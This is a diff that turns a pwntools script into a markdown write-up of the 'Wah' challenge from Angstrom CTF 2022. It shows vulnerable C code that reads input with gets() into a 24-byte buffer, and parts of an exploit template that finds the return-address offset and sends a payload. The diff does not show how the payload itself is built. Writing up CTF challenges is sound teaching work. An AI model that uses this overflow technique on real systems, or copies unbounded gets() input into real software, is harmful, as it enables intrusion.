@@ -1,5 +1,68 @@
-from pwn import *
+---
+name: Wah (2022)
+event: Angstrom CTF 2022
+category: Pwn
+description: Writeup for Wah (Pwn) - Angstrom CTF (2022) 💜
+layout:
+    title:
+        visible: true
+    description:
+        visible: true
+    tableOfContents:
+        visible: false
+    outline:
+        visible: true
+    pagination:
+        visible: true
+---
 
+# Wah
+
+## Video Walkthrough
+
+[![VIDEO](https://img.youtube.com/vi/YmJoeoXilac/0.jpg)](https://youtu.be/YmJoeoXilac?t=2726 "Angstrom CTF 2022: Wah")
+
+## Description
+
+> Baby friendly!
+
+## Source
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+void flag(){
+    char flag[128];
+
+    FILE *file = fopen("flag.txt","r");
+    if (!file) {
+        puts("Error: missing flag.txt.");
+        exit(1);
+    }
+
+    fgets(flag, 128, file);
+    puts(flag);
+}
+
+int main(){
+    setbuf(stdout, NULL);
+    gid_t gid = getegid();
+    setresgid(gid, gid, gid);
+
+    char cry[24];
+
+    printf("Cry: ");
+
+    gets(cry);
+    return 0;
+}
+```
+
+## Solution
+
+```py
+from pwn import *
 
 # Allows you to switch between local/GDB/remote from terminal
 def start(argv=[], *a, **kw):
@@ -9,7 +72,6 @@ def start(argv=[], *a, **kw):
         return remote(sys.argv[1], sys.argv[2], *a, **kw)
     else:  # Run locally
         return process([exe] + argv, *a, **kw)
-
 
 # Find offset to EIP/RIP for buffer overflows
 def find_ip(payload):
@@ -23,7 +85,6 @@ def find_ip(payload):
     ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
     warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
     return ip_offset
-
 
 # Specify GDB script here (breakpoints etc)
 gdbscript = '''
@@ -58,3 +119,4 @@ io.sendlineafter(b':', payload)
 
 # Got Shell?
 io.interactive()
+```
